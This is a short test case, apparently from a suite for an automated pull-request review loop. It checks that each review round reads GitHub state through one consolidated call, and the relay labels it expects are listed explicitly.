  it('reads GitHub through one state call per step, not an agent per command', async () => {
    const { calls } = await runLoop({ review: reviewerFinds([1]), fix: fixOpen });
    const relays = calls
      .filter(
        (c) =>
          !c.sub &&
          ['state', 'head', 'files', 'disk', 'threads', 'post', 'summary'].includes(c.kind),
      )
      .map((c) => c.label);
    // before: head, files, threads:start, disk, post, threads, head, disk, threads, threads:final, summary
    expect(relays).toEqual(['state:r1', 'post:r1', 'state:r2', 'threads:r2', 'summary']);
    expect(calls.find((c) => c.label === 'post:r1')?.prompt).toContain('--round 1 --list');
  });
});
